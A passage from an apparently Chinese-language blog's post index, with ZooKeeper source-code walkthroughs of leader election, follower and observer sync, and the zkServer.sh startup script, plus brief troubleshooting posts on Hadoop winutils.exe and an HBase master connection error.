self.jmxLeaderElectionBean = null; &#125; try &#123; self.setCurrentVote(new Vote(self.getId(), self.getLastLoggedZxid())); // We are going to look for a leader by casting a vote for ourself byte requestBytes[] = new byte[4]; ByteBuffer requestBuffer = ByteBuffer.wrap(requestBytes); byte responseBytes[] = new byte[28]; ByteBuffer responseBuffer = ByteBuffer.wrap(responseBytes); /* The current vote for the leader. Initially me! */ DatagramSocket s = null; try &#123; s = new DatagramSocket(); s.setSoTimeout(200); &#125; catch (SocketException e1) &#123; LOG.error(\"Socket exception when creating socket for leader election\", e1); System.exit(4); &#125; DatagramPacket requestPacket = new DatagramPacket(requestBytes, requestBytes.length); DatagramPacket responsePacket = new DatagramPacket(responseBytes, responseBytes.length); int xid = epochGen.nextInt(); while (self.isRunning()) &#123; HashMap&lt;InetSocketAddress, Vote&gt; votes = new HashMap&lt;InetSocketAddress, Vote&gt;(self.getVotingView().size()); requestBuffer.clear(); requestBuffer.putInt(xid); requestPacket.setLength(4); HashSet&lt;Long&gt; heardFrom = new HashSet&lt;Long&gt;(); for (QuorumServer server : self.getVotingView().values()) &#123; LOG.info(\"Server address: \" + server.addr); try &#123; requestPacket.setSocketAddress(server.addr); &#125; catch (IllegalArgumentException e) &#123; // Sun doesn't include the address that causes this // exception to be thrown, so we wrap the exception // in order to capture this critical detail. throw new IllegalArgumentException( \"Unable to set socket address on packet, msg:\" + e.getMessage() + \" with addr:\" + server.addr, e); &#125; try &#123; //发送请求信息 s.send(requestPacket); responsePacket.setLength(responseBytes.length); //接收响应信息 s.receive(responsePacket); if (responsePacket.getLength() != responseBytes.length) &#123; LOG.error(\"Got a short response: \" + responsePacket.getLength()); continue; &#125; responseBuffer.clear(); int recvedXid = responseBuffer.getInt(); if (recvedXid != xid) &#123; LOG.error(\"Got bad xid: expected \" + xid + \" got \" + recvedXid); continue; &#125; long peerId = responseBuffer.getLong(); heardFrom.add(peerId); //if(server.id != peerId)&#123; //封装投票信息 Vote vote = new Vote(responseBuffer.getLong(), responseBuffer.getLong()); InetSocketAddress addr = (InetSocketAddress) responsePacket .getSocketAddress(); votes.put(addr, vote); //&#125; &#125; catch (IOException e) &#123; LOG.warn(\"Ignoring exception while looking for leader\", e); // Errors are okay, since hosts may be // down &#125; &#125; //投票结果 ElectionResult result = countVotes(votes, heardFrom); //如果没有选出leader,则重新投票 if (result.numValidVotes == 0) &#123; self.setCurrentVote(new Vote(self.getId(), self.getLastLoggedZxid())); &#125; else &#123; //胜出者&gt;=0 if (result.winner.getId() &gt;= 0) &#123; //设置当前投票信息 self.setCurrentVote(result.vote); //超过半数胜出 if (result.winningCount &gt; (self.getVotingView().size() / 2)) &#123; //设置为胜出者的投票信息 self.setCurrentVote(result.winner); s.close(); Vote current = self.getCurrentVote(); LOG.info(\"Found leader: my type is: \" + self.getLearnerType()); if (self.getLearnerType() == LearnerType.OBSERVER) &#123; if (current.getId() == self.getId()) &#123; // This should never happen! LOG.error(\"OBSERVER elected as leader!\"); Thread.sleep(100); &#125; else &#123; self.setPeerState(ServerState.OBSERVING); Thread.sleep(100); return current; &#125; &#125; else &#123; //设置集群状态 self.setPeerState((current.getId() == self.getId()) ? ServerState.LEADING: ServerState.FOLLOWING); if (self.getPeerState() == ServerState.FOLLOWING) &#123; Thread.sleep(100); &#125; return current; &#125; &#125; &#125; &#125; Thread.sleep(1000); &#125; return null; &#125; finally &#123; try &#123; if(self.jmxLeaderElectionBean != null)&#123; MBeanRegistry.getInstance().unregister( self.jmxLeaderElectionBean); &#125; &#125; catch (Exception e) &#123; LOG.warn(\"Failed to unregister with JMX\", e); &#125; self.jmxLeaderElectionBean = null; &#125; &#125; Observer 的 observeLeader 方法构造并同步 observer 信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344//构造observer对象protected Observer makeObserver(FileTxnSnapLog logFactory) throws IOException &#123; return new Observer(this, new ObserverZooKeeperServer(logFactory, this, new ZooKeeperServer.BasicDataTreeBuilder(), this.zkDb)); &#125;// observer和leader同步void observeLeader() throws InterruptedException &#123; //注册jmx zk.registerJMX(new ObserverBean(this, zk), self.jmxLocalPeerBean); try &#123; //查找leader QuorumServer leaderServer = findLeader(); LOG.info(\"Observing \" + leaderServer.addr); try &#123; //连接到leader connectToLeader(leaderServer.addr, leaderServer.hostname); long newLeaderZxid = registerWithLeader(Leader.OBSERVERINFO); //和leader同步 syncWithLeader(newLeaderZxid); QuorumPacket qp = new QuorumPacket(); while (this.isRunning()) &#123; //读取数据包 readPacket(qp); //读取数据包 processPacket(qp); &#125; &#125; catch (Exception e) &#123; LOG.warn(\"Exception when observing the leader\", e); try &#123; sock.close(); &#125; catch (IOException e1) &#123; e1.printStackTrace(); &#125; // clear pending revalidations pendingRevalidations.clear(); &#125; &#125; finally &#123; zk.unregisterJMX(this); &#125; &#125; 和 leader 同步历史信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211protected void syncWithLeader(long newLeaderZxid) throws IOException, InterruptedException&#123; QuorumPacket ack = new QuorumPacket(Leader.ACK, 0, null, null); QuorumPacket qp = new QuorumPacket(); long newEpoch = ZxidUtils.getEpochFromZxid(newLeaderZxid); // In the DIFF case we don't need to do a snapshot because the transactions will sync on top of any existing snapshot // For SNAP and TRUNC the snapshot is needed to save that history boolean snapshotNeeded = true; readPacket(qp); LinkedList&lt;Long&gt; packetsCommitted = new LinkedList&lt;Long&gt;(); LinkedList&lt;PacketInFlight&gt; packetsNotCommitted = new LinkedList&lt;PacketInFlight&gt;(); synchronized (zk) &#123; if (qp.getType() == Leader.DIFF) &#123; LOG.info(\"Getting a diff from the leader 0x&#123;&#125;\", Long.toHexString(qp.getZxid())); snapshotNeeded = false; &#125; // 下载日志文件类型 else if (qp.getType() == Leader.SNAP) &#123; LOG.info(\"Getting a snapshot from leader 0x\" + Long.toHexString(qp.getZxid())); // The leader is going to dump the database // clear our own database and read zk.getZKDatabase().clear(); //反序列化日志快照信息 zk.getZKDatabase().deserializeSnapshot(leaderIs); String signature = leaderIs.readString(\"signature\"); if (!signature.equals(\"BenWasHere\")) &#123; LOG.error(\"Missing signature. Got \" + signature); throw new IOException(\"Missing signature\"); &#125; zk.getZKDatabase().setlastProcessedZxid(qp.getZxid()); //截断事务日志 &#125; else if (qp.getType() == Leader.TRUNC) &#123; //we need to truncate the log to the lastzxid of the leader LOG.warn(\"Truncating log to get in sync with the leader 0x\" + Long.toHexString(qp.getZxid())); boolean truncated=zk.getZKDatabase().truncateLog(qp.getZxid()); if (!truncated) &#123; // not able to truncate the log LOG.error(\"Not able to truncate the log \" + Long.toHexString(qp.getZxid())); System.exit(13); &#125; zk.getZKDatabase().setlastProcessedZxid(qp.getZxid()); &#125; else &#123; LOG.error(\"Got unexpected packet from leader \" + qp.getType() + \" exiting ... \" ); System.exit(13); &#125; //创建session跟踪 zk.createSessionTracker(); long lastQueued = 0; // in Zab V1.0 (ZK 3.4+) we might take a snapshot when we get the NEWLEADER message, but in pre V1.0 // we take the snapshot on the UPDATE message, since Zab V1.0 also gets the UPDATE (after the NEWLEADER) // we need to make sure that we don't take the snapshot twice. boolean isPreZAB1_0 = true; //If we are not going to take the snapshot be sure the transactions are not applied in memory // but written out to the transaction log boolean writeToTxnLog = !snapshotNeeded; // we are now going to start getting transactions to apply followed by an UPTODATE outerLoop: while (self.isRunning()) &#123; readPacket(qp); switch(qp.getType()) &#123; case Leader.PROPOSAL: PacketInFlight pif = new PacketInFlight(); pif.hdr = new TxnHeader(); //反序列化 pif.rec = SerializeUtils.deserializeTxn(qp.getData(), pif.hdr); if (pif.hdr.getZxid() != lastQueued + 1) &#123; LOG.warn(\"Got zxid 0x\" + Long.toHexString(pif.hdr.getZxid()) + \" expected 0x\" + Long.toHexString(lastQueued + 1)); &#125; lastQueued = pif.hdr.getZxid(); //放入未提交链表 packetsNotCommitted.add(pif); break; //提交提议 case Leader.COMMIT: if (!writeToTxnLog) &#123; pif = packetsNotCommitted.peekFirst(); if (pif.hdr.getZxid() != qp.getZxid()) &#123; LOG.warn(\"Committing \" + qp.getZxid() + \", but next proposal is \" + pif.hdr.getZxid()); &#125; else &#123; zk.processTxn(pif.hdr, pif.rec); packetsNotCommitted.remove(); &#125; &#125; else &#123; packetsCommitted.add(qp.getZxid()); &#125; break; //observer接收和提交提议 case Leader.INFORM: /* * Only observer get this type of packet. We treat this * as receiving PROPOSAL and COMMMIT. */ PacketInFlight packet = new PacketInFlight(); packet.hdr = new TxnHeader(); packet.rec = SerializeUtils.deserializeTxn(qp.getData(), packet.hdr); // Log warning message if txn comes out-of-order if (packet.hdr.getZxid() != lastQueued + 1) &#123; LOG.warn(\"Got zxid 0x\" + Long.toHexString(packet.hdr.getZxid()) + \" expected 0x\" + Long.toHexString(lastQueued + 1)); &#125; lastQueued = packet.hdr.getZxid(); if (!writeToTxnLog) &#123; // Apply to db directly if we haven't taken the snapshot zk.processTxn(packet.hdr, packet.rec); &#125; else &#123; packetsNotCommitted.add(packet); packetsCommitted.add(qp.getZxid()); &#125; break; //更新到最新时间 case Leader.UPTODATE: if (isPreZAB1_0) &#123; zk.takeSnapshot(); self.setCurrentEpoch(newEpoch); &#125; self.cnxnFactory.setZooKeeperServer(zk); break outerLoop; //新的leader case Leader.NEWLEADER: // Getting NEWLEADER here instead of in discovery // means this is Zab 1.0 // Create updatingEpoch file and remove it after current // epoch is set. QuorumPeer.loadDataBase() uses this file to // detect the case where the server was terminated after // taking a snapshot but before setting the current epoch. File updating = new File(self.getTxnFactory().getSnapDir(), QuorumPeer.UPDATING_EPOCH_FILENAME); if (!updating.exists() &amp;&amp; !updating.createNewFile()) &#123; throw new IOException(\"Failed to create \" + updating.toString()); &#125; if (snapshotNeeded) &#123; zk.takeSnapshot(); &#125; self.setCurrentEpoch(newEpoch); if (!updating.delete()) &#123; throw new IOException(\"Failed to delete \" + updating.toString()); &#125; writeToTxnLog = true; //Anything after this needs to go to the transaction log, not applied directly in memory isPreZAB1_0 = false; writePacket(new QuorumPacket(Leader.ACK, newLeaderZxid, null, null), true); break; &#125; &#125; &#125; ack.setZxid(ZxidUtils.makeZxid(newEpoch, 0)); writePacket(ack, true); sock.setSoTimeout(self.tickTime * self.syncLimit); //启动对应的zkserver zk.startup(); /* * Update the election vote here to ensure that all members of the * ensemble report the same vote to new servers that start up and * send leader election notifications to the ensemble. * * @see https://issues.apache.org/jira/browse/ZOOKEEPER-1732 更新投票信息，确保新的server收到最新的投票信息 */ self.updateElectionVote(newEpoch); // follower获取增量日志信息 if (zk instanceof FollowerZooKeeperServer) &#123; FollowerZooKeeperServer fzk = (FollowerZooKeeperServer)zk; for(PacketInFlight p: packetsNotCommitted) &#123; fzk.logRequest(p.hdr, p.rec); &#125; for(Long zxid: packetsCommitted) &#123; //提交请求 fzk.commit(zxid); &#125; //observer 获取增量日志信息 &#125; else if (zk instanceof ObserverZooKeeperServer) &#123; ObserverZooKeeperServer ozk = (ObserverZooKeeperServer) zk; for (PacketInFlight p : packetsNotCommitted) &#123; Long zxid = packetsCommitted.peekFirst(); if (p.hdr.getZxid() != zxid) &#123; // log warning message if there is no matching commit // old leader send outstanding proposal to observer LOG.warn(\"Committing \" + Long.toHexString(zxid) + \", but next proposal is \" + Long.toHexString(p.hdr.getZxid())); continue; &#125; packetsCommitted.remove(); //封装请求信息 Request request = new Request(null, p.hdr.getClientId(), p.hdr.getCxid(), p.hdr.getType(), null, null); request.txn = p.rec; request.hdr = p.hdr; //提交请求 ozk.commitRequest(request); &#125; &#125; else &#123; // New server type need to handle in-flight packets throw new UnsupportedOperationException(\"Unknown server type\"); &#125; &#125; Follower 的 followLeader 方法1234567891011121314151617181920212223242526272829303132333435363738394041424344void followLeader() throws InterruptedException &#123; self.end_fle = Time.currentElapsedTime(); long electionTimeTaken = self.end_fle - self.start_fle; self.setElectionTimeTaken(electionTimeTaken); LOG.info(\"FOLLOWING - LEADER ELECTION TOOK - &#123;&#125;\", electionTimeTaken); self.start_fle = 0; self.end_fle = 0; fzk.registerJMX(new FollowerBean(this, zk), self.jmxLocalPeerBean); try &#123; QuorumServer leaderServer = findLeader(); try &#123; connectToLeader(leaderServer.addr, leaderServer.hostname); long newEpochZxid = registerWithLeader(Leader.FOLLOWERINFO); //check to see if the leader zxid is lower than ours //this should never happen but is just a safety check long newEpoch = ZxidUtils.getEpochFromZxid(newEpochZxid); if (newEpoch &lt; self.getAcceptedEpoch()) &#123; LOG.error(\"Proposed leader epoch \" + ZxidUtils.zxidToString(newEpochZxid) + \" is less than our accepted epoch \" + ZxidUtils.zxidToString(self.getAcceptedEpoch())); throw new IOException(\"Error: Epoch of leader is lower\"); &#125; //和leader同步信息 syncWithLeader(newEpochZxid); QuorumPacket qp = new QuorumPacket(); while (this.isRunning()) &#123; readPacket(qp); processPacket(qp); &#125; &#125; catch (Exception e) &#123; LOG.warn(\"Exception when following the leader\", e); try &#123; sock.close(); &#125; catch (IOException e1) &#123; e1.printStackTrace(); &#125; // clear pending revalidations pendingRevalidations.clear(); &#125; &#125; finally &#123; zk.unregisterJMX((Learner)this); &#125; &#125; Leader 的 lead 方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148void lead() throws IOException, InterruptedException &#123; //选举结束时间 self.end_fle = Time.currentElapsedTime(); //选举耗时 long electionTimeTaken = self.end_fle - self.start_fle; self.setElectionTimeTaken(electionTimeTaken); LOG.info(\"LEADING - LEADER ELECTION TOOK - &#123;&#125;\", electionTimeTaken); self.start_fle = 0; self.end_fle = 0; //注册Leader JMX zk.registerJMX(new LeaderBean(this, zk), self.jmxLocalPeerBean); try &#123; self.tick.set(0); //加载db数据到内存 zk.loadData(); //状态对比封装 leaderStateSummary = new StateSummary(self.getCurrentEpoch(), zk.getLastProcessedZxid()); // Start thread that waits for connection requests from // new followers. //启动接收follower的请求线程 cnxAcceptor = new LearnerCnxAcceptor(); cnxAcceptor.start(); readyToStart = true; //获取epoch long epoch = getEpochToPropose(self.getId(), self.getAcceptedEpoch()); zk.setZxid(ZxidUtils.makeZxid(epoch, 0)); synchronized(this)&#123; lastProposed = zk.getZxid(); &#125; newLeaderProposal.packet = new QuorumPacket(NEWLEADER, zk.getZxid(), null, null); if ((newLeaderProposal.packet.getZxid() &amp; 0xffffffffL) != 0) &#123; LOG.info(\"NEWLEADER proposal has Zxid of \" + Long.toHexString(newLeaderProposal.packet.getZxid())); &#125; //等待ack响应 waitForEpochAck(self.getId(), leaderStateSummary); self.setCurrentEpoch(epoch); // We have to get at least a majority of servers in sync with // us. We do this by waiting for the NEWLEADER packet to get // acknowledged try &#123; //等待半数server响应 waitForNewLeaderAck(self.getId(), zk.getZxid()); &#125; catch (InterruptedException e) &#123; shutdown(\"Waiting for a quorum of followers, only synced with sids: [ \" + getSidSetString(newLeaderProposal.ackSet) + \" ]\"); HashSet&lt;Long&gt; followerSet = new HashSet&lt;Long&gt;(); for (LearnerHandler f : learners) followerSet.add(f.getSid()); if (self.getQuorumVerifier().containsQuorum(followerSet)) &#123; LOG.warn(\"Enough followers present. \" + \"Perhaps the initTicks need to be increased.\"); &#125; Thread.sleep(self.tickTime); self.tick.incrementAndGet(); return; &#125; //启动zkserver startZkServer(); /** * WARNING: do not use this for anything other than QA testing * on a real cluster. Specifically to enable verification that quorum * can handle the lower 32bit roll-over issue identified in * ZOOKEEPER-1277. Without this option it would take a very long * time (on order of a month say) to see the 4 billion writes * necessary to cause the roll-over to occur. * * This field allows you to override the zxid of the server. Typically * you'll want to set it to something like 0xfffffff0 and then * start the quorum, run some operations and see the re-election. 测试使用 */ String initialZxid = System.getProperty(\"zookeeper.testingonly.initialZxid\"); if (initialZxid != null) &#123; long zxid = Long.parseLong(initialZxid); zk.setZxid((zk.getZxid() &amp; 0xffffffff00000000L) | zxid); &#125; if (!System.getProperty(\"zookeeper.leaderServes\", \"yes\").equals(\"no\")) &#123; self.cnxnFactory.setZooKeeperServer(zk); &#125; // Everything is a go, simply start counting the ticks // WARNING: I couldn't find any wait statement on a synchronized // block that would be notified by this notifyAll() call, so // I commented it out //synchronized (this) &#123; // notifyAll(); //&#125; // We ping twice a tick, so we only update the tick every other // iteration boolean tickSkip = true; while (true) &#123; Thread.sleep(self.tickTime / 2); if (!tickSkip) &#123; self.tick.incrementAndGet(); &#125; //同步set HashSet&lt;Long&gt; syncedSet = new HashSet&lt;Long&gt;(); // lock on the followers when we use it. syncedSet.add(self.getId()); for (LearnerHandler f : getLearners()) &#123; // Synced set is used to check we have a supporting quorum, so only // PARTICIPANT, not OBSERVER, learners should be used //PARTICIPANT类型加入同步set if (f.synced() &amp;&amp; f.getLearnerType() == LearnerType.PARTICIPANT) &#123; syncedSet.add(f.getSid()); &#125; f.ping(); &#125; //检查leader运行状态 if (!this.isRunning()) &#123; shutdown(\"Unexpected internal error\"); return; &#125; if (!tickSkip &amp;&amp; !self.getQuorumVerifier().containsQuorum(syncedSet)) &#123; //if (!tickSkip &amp;&amp; syncedCount &lt; self.quorumPeers.size() / 2) &#123; // Lost quorum, shutdown shutdown(\"Not sufficient followers synced, only synced with sids: [ \" + getSidSetString(syncedSet) + \" ]\"); // make sure the order is the same! // the leader goes to looking return; &#125; tickSkip = !tickSkip; &#125; &#125; finally &#123; zk.unregisterJMX(this); &#125; &#125; 小结 集群最主要的就是 leader 选举和广播,默认的选举算法是 FastLeaderElection,observer 不参与投票。 zookeeper 内部有大量 NIO 的请求响应,处理客户端请求和 leader 选举的线程是分离的。 线程、并发锁、wait/notify 机制等在 zookeeper 中大量应用. 下边是经典的 paxos 算法的理论和证明过程. 参考资料 Aapche zookeeper zab1.0 wiki ZooKeeper’s atomic broadcast protocol:Theory and practice The Part-Time Parliament The Part-Time Parliament","updated":"2020-07-19T00:23:27.843Z","tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"http://xwolf191.github.io/tags/zookeeper/"}]},{"title":"Could not locate executable winutils.exe in the Hadoop binaries","date":"2019-04-12T10:10:00.000Z","path":"2019/04/12/大数据/Could not locate executable winutils.exe in the Hadoop binaries/","text":"windows上连接hadoop抛出如下异常.https://github.com/steveloughran/winutils在windows上运行hadoop缺少winutils.exe,从上边的地址下载完成后将winutils.exe复制到hadoop bin目录中,设置好环境变量即可.","updated":"2020-07-19T00:23:27.952Z","tags":[{"name":"hadoop","slug":"hadoop","permalink":"http://xwolf191.github.io/tags/hadoop/"}]},{"title":"failed Connection refused localhost127.0.0.1:16000","date":"2019-04-11T10:45:00.000Z","path":"2019/04/11/大数据/failed Connection refused localhost127.0.0.116000/","text":"hbase regionserver 启动失败,查看日志 123Caused by: org.apache.hbase.thirdparty.io.netty.channel.AbstractChannel$AnnotatedConnectException: syscall:getsockopt(..) failed: Connection refused: localhost/127.0.0.1:16000 at org.apache.hbase.thirdparty.io.netty.channel.unix.Socket.finishConnect(..)(Unknown Source)Caused by: org.apache.hbase.thirdparty.io.netty.channel.unix.Errors$NativeConnectException: syscall:getsockopt(..) failed: Connection refused 16000 端口拒绝连接。hbase shell 中 dead server 为 3. 12hbase(main):003:0&gt; status1 active master, 0 backup masters, 0 servers, 3 dead, 0.3333 average load 16000 是 master 的默认端口。和 master 通信失败。但是 zookeeper 中/hbase/master 节点的数据显示 localhost。把 master 对应的 hostname 修改为 hadoop01,并且配置 hosts,删除 localhost 的配置信息,将 ip 和 hostname 映射信息配置 ok。 123456[root@hadoop04 logs]# cat /etc/hosts192.168.19.130 hadoop01192.168.19.131 hadoop02192.168.19.132 hadoop03192.168.19.133 hadoop04192.168.19.134 hadoop05 重启集群即可。此时 regionserver 已经正常启动且和 master 通信成功。 12hbase(main):003:0&gt; status1 active master, 1 backup masters, 3 servers, 0 dead, 0.3333 average load 此时,hbase 服务显示正常。","updated":"2020-07-19T00:23:27.965Z","tags":[{"name":"hbase","slug":"hbase","permalink":"http://xwolf191.github.io/tags/hbase/"}]},{"title":"zookeeper 源码分析二之 server 启动过程(standalone)","date":"2019-04-06T09:30:00.000Z","path":"2019/04/06/distributed/zookeeper源码分析二之server启动过程(standalone)/","text":"zk server 启动简单的流程图 server 启动通常用 zkServer.sh start 命令来启动 zk server。我们从这里才查看 zk server 的启动入口。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232#!/usr/bin/env bash## 当前脚本所在的路径ZOOBIN=\"$&#123;BASH_SOURCE-$0&#125;\"## 当前脚本所闻的目录名称ZOOBIN=\"$(dirname \"$&#123;ZOOBIN&#125;\")\"# 进入ZOOBIN所有的目录并显示当前位置ZOOBINDIR=\"$(cd \"$&#123;ZOOBIN&#125;\"; pwd)\"if [ -e \"$ZOOBIN/../libexec/zkEnv.sh\" ]; then . \"$ZOOBINDIR/../libexec/zkEnv.sh\"else . \"$ZOOBINDIR/zkEnv.sh\"fi# See the following page for extensive details on setting# up the JVM to accept JMX remote management:# http://java.sun.com/javase/6/docs/technotes/guides/management/agent.html# by default we allow local JMX connections## 如果JMXLOCALONLY不存在则JMXLOCALONLY=falseif [ \"x$JMXLOCALONLY\" = \"x\" ]then JMXLOCALONLY=falsefi# JMX是否被禁用。如果JMX没有被禁用,检测是否需要SSL或AUTH认证等信息.最终拼接带对应虚拟机参数的启动类if [ \"x$JMXDISABLE\" = \"x\" ] || [ \"$JMXDISABLE\" = 'false' ]then echo \"ZooKeeper JMX enabled by default\" &gt;&amp;2 if [ \"x$JMXPORT\" = \"x\" ] then # for some reason these two options are necessary on jdk6 on Ubuntu # accord to the docs they are not necessary, but otw jconsole cannot # do a local attach ZOOMAIN=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=$JMXLOCALONLY org.apache.zookeeper.server.quorum.QuorumPeerMain\" else if [ \"x$JMXAUTH\" = \"x\" ] then JMXAUTH=false fi if [ \"x$JMXSSL\" = \"x\" ] then JMXSSL=false fi if [ \"x$JMXLOG4J\" = \"x\" ] then JMXLOG4J=true fi echo \"ZooKeeper remote JMX Port set to $JMXPORT\" &gt;&amp;2 echo \"ZooKeeper remote JMX authenticate set to $JMXAUTH\" &gt;&amp;2 echo \"ZooKeeper remote JMX ssl set to $JMXSSL\" &gt;&amp;2 echo \"ZooKeeper remote JMX log4j set to $JMXLOG4J\" &gt;&amp;2 ZOOMAIN=\"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=$JMXPORT -Dcom.sun.management.jmxremote.authenticate=$JMXAUTH -Dcom.sun.management.jmxremote.ssl=$JMXSSL -Dzookeeper.jmx.log4j.disable=$JMXLOG4J org.apache.zookeeper.server.quorum.QuorumPeerMain\" fielse echo \"JMX disabled by user request\" &gt;&amp;2 ZOOMAIN=\"org.apache.zookeeper.server.quorum.QuorumPeerMain\"fi## 是否有虚拟机的参数配置信息if [ \"x$SERVER_JVMFLAGS\" != \"x\" ]then JVMFLAGS=\"$SERVER_JVMFLAGS $JVMFLAGS\"fi## 第二个参数是配置文件信息if [ \"x$2\" != \"x\" ]then ZOOCFG=\"$ZOOCFGDIR/$2\"fi# if we give a more complicated path to the config, don't screw around in $ZOOCFGDIRif [ \"x$(dirname \"$ZOOCFG\")\" != \"x$ZOOCFGDIR\" ]then ZOOCFG=\"$2\"fi# 检测linux的环境信息if $cygwinthen ZOOCFG=`cygpath -wp \"$ZOOCFG\"` # cygwin has a \"kill\" in the shell itself, gets confused KILL=/bin/killelse KILL=killfiecho \"Using config: $ZOOCFG\" &gt;&amp;2## 检测OS的类型,solaris特殊处理case \"$OSTYPE\" in*solaris*) GREP=/usr/xpg4/bin/grep ;;*) GREP=grep ;;esacif [ -z \"$ZOOPIDFILE\" ]; then ZOO_DATADIR=\"$($GREP \"^[[:space:]]*dataDir\" \"$ZOOCFG\" | sed -e 's/.*=//')\" if [ ! -d \"$ZOO_DATADIR\" ]; then mkdir -p \"$ZOO_DATADIR\" fi ZOOPIDFILE=\"$ZOO_DATADIR/zookeeper_server.pid\"else # ensure it exists, otw stop will fail mkdir -p \"$(dirname \"$ZOOPIDFILE\")\"fi## 创建目录if [ ! -w \"$ZOO_LOG_DIR\" ] ; thenmkdir -p \"$ZOO_LOG_DIR\"fi# 创建out文件_ZOO_DAEMON_OUT=\"$ZOO_LOG_DIR/zookeeper.out\"## 获取第一参数，为对应方法名称case $1 in# 启动serverstart) echo -n \"Starting zookeeper ... \" if [ -f \"$ZOOPIDFILE\" ]; then if kill -0 `cat \"$ZOOPIDFILE\"` &gt; /dev/null 2&gt;&amp;1; then echo $command already running as process `cat \"$ZOOPIDFILE\"`. exit 0 fi fi nohup \"$JAVA\" \"-Dzookeeper.log.dir=$&#123;ZOO_LOG_DIR&#125;\" \"-Dzookeeper.root.logger=$&#123;ZOO_LOG4J_PROP&#125;\" \\ -cp \"$CLASSPATH\" $JVMFLAGS $ZOOMAIN \"$ZOOCFG\" &gt; \"$_ZOO_DAEMON_OUT\" 2&gt;&amp;1 &lt; /dev/null &amp; if [ $? -eq 0 ] then case \"$OSTYPE\" in *solaris*) /bin/echo \"$&#123;!&#125;\\\\c\" &gt; \"$ZOOPIDFILE\" ;; *) /bin/echo -n $! &gt; \"$ZOOPIDFILE\" ;; esac if [ $? -eq 0 ]; then sleep 1 echo STARTED else echo FAILED TO WRITE PID exit 1 fi else echo SERVER DID NOT START exit 1 fi ;;#区别于start,非后台启动start-foreground) ZOO_CMD=(exec \"$JAVA\") if [ \"$&#123;ZOO_NOEXEC&#125;\" != \"\" ]; then ZOO_CMD=(\"$JAVA\") fi \"$&#123;ZOO_CMD[@]&#125;\" \"-Dzookeeper.log.dir=$&#123;ZOO_LOG_DIR&#125;\" \"-Dzookeeper.root.logger=$&#123;ZOO_LOG4J_PROP&#125;\" \\ -cp \"$CLASSPATH\" $JVMFLAGS $ZOOMAIN \"$ZOOCFG\" ;;# 打印命令print-cmd) echo \"\\\"$JAVA\\\" -Dzookeeper.log.dir=\\\"$&#123;ZOO_LOG_DIR&#125;\\\" -Dzookeeper.root.logger=\\\"$&#123;ZOO_LOG4J_PROP&#125;\\\" -cp \\\"$CLASSPATH\\\" $JVMFLAGS $ZOOMAIN \\\"$ZOOCFG\\\" &gt; \\\"$_ZOO_DAEMON_OUT\\\" 2&gt;&amp;1 &lt; /dev/null\" ;;# 停止server,kill掉进程并删除pid文件stop) echo -n \"Stopping zookeeper ... \" if [ ! -f \"$ZOOPIDFILE\" ] then echo \"no zookeeper to stop (could not find file $ZOOPIDFILE)\" else $KILL -9 $(cat \"$ZOOPIDFILE\") rm \"$ZOOPIDFILE\" echo STOPPED fi exit 0 ;;# 升级zk 数据库upgrade) shift echo \"upgrading the servers to 3.*\" \"$JAVA\" \"-Dzookeeper.log.dir=$&#123;ZOO_LOG_DIR&#125;\" \"-Dzookeeper.root.logger=$&#123;ZOO_LOG4J_PROP&#125;\" \\ -cp \"$CLASSPATH\" $JVMFLAGS org.apache.zookeeper.server.upgrade.UpgradeMain $&#123;@&#125; echo \"Upgrading ... \" ;;# 重启serverrestart) shift \"$0\" stop $&#123;@&#125; sleep 3 \"$0\" start $&#123;@&#125; ;;# 获取server状态信息,主要是server的四字命令status) # -q is necessary on some versions of linux where nc returns too quickly, and no stat result is output clientPortAddress=`$GREP \"^[[:space:]]*clientPortAddress[^[:alpha:]]\" \"$ZOOCFG\" | sed -e 's/.*=//'` if ! [ $clientPortAddress ] then clientPortAddress=\"localhost\" fi clientPort=`$GREP \"^[[:space:]]*clientPort[^[:alpha:]]\" \"$ZOOCFG\" | sed -e 's/.*=//'` STAT=`\"$JAVA\" \"-Dzookeeper.log.dir=$&#123;ZOO_LOG_DIR&#125;\" \"-Dzookeeper.root.logger=$&#123;ZOO_LOG4J_PROP&#125;\" \\ -cp \"$CLASSPATH\" $JVMFLAGS org.apache.zookeeper.client.FourLetterWordMain \\ $clientPortAddress $clientPort srvr 2&gt; /dev/null \\ | $GREP Mode` if [ \"x$STAT\" = \"x\" ] then echo \"Error contacting service. It is probably not running.\" exit 1 else echo $STAT exit 0 fi ;; # 不是以上命令则提示对应的命令信息*) echo \"Usage: $0 &#123;start|start-foreground|stop|restart|status|upgrade|print-cmd&#125;\" &gt;&amp;2esac 主要看 start 方法,如果存在 pid 文件则直接退出. QuorumPeerMain 启动过程main 方法为 server 启动入口. 1234567891011121314151617181920public static void main(String[] args) &#123; QuorumPeerMain main = new QuorumPeerMain(); try &#123; main.initializeAndRun(args); &#125; catch (IllegalArgumentException e) &#123; LOG.error(\"Invalid arguments, exiting abnormally\", e); LOG.info(USAGE); System.err.println(USAGE); System.exit(2); &#125; catch (ConfigException e) &#123; LOG.error(\"Invalid config, exiting abnormally\", e); System.err.println(\"Invalid config, exiting abnormally\"); System.exit(2); &#125; catch (Exception e) &#123; LOG.error(\"Unexpected exception, exiting abnormally\", e); System.exit(1); &#125; LOG.info(\"Exiting normally\"); System.exit(0); &#125; 调用 initializeAndRun 方法初始化并运行。 1234567891011121314151617181920212223242526272829/** 初始化并运行*/protected void initializeAndRun(String[] args) throws ConfigException, IOException &#123; // 创建配置对象 QuorumPeerConfig config = new QuorumPeerConfig(); if (args.length == 1) &#123; 